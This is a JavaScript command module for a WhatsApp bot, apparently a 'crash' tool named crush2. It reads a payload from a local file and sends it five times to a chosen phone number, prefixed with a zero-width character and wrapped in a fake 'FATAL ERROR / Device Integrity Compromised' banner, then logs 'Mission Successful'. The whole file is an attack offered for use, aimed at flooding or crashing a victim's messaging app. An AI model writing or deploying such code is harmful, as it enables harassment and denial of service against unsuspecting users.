const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "crush2",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const payload = fs.readFileSync('./lib/payloads/crush2.txt', 'utf-8');

        msg.reply(fancy("🥀 deploying the final crush strike..."));

        for (let i = 0; i < 5; i++) {
            await conn.sendMessage(target, { 
                text: "\u200B" + payload,
                contextInfo: { 
                    externalAdReply: { title: "FATAL ERROR", body: "Device Integrity Compromised", mediaType: 1, thumbnailUrl: "https://files.catbox.moe/horror.jpg" },
                    forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid }
                } 
            });
        }
        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: CRUSH2 mission complete.") });
    }
};
